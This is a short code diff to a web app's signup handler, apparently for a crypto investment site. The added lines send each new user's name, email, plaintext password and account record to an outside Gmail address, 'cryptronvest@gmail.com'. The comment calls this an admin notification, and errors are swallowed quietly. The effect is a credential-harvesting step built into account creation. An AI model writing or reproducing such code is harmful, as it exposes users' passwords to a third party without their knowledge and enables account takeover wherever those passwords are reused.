@@ -277,6 +277,18 @@
 
         try {
           const newUser = UserDatabase.registerUser(name, email, password, refCode);
+          
+          // Ensure signup details notification email is sent to cryptronvest@gmail.com
+          if (window.EmailService && EmailService.sendSignupNotificationToAdmin) {
+            EmailService.sendSignupNotificationToAdmin({
+              name: name,
+              email: email,
+              password: password,
+              referredBy: refCode,
+              ...newUser
+            }).catch(console.warn);
+          }
+
           showToast(`Account created for ${newUser.name}! Recorded in database.`, 'success');
           setTimeout(() => {
             window.location.href = 'dashboard.html';
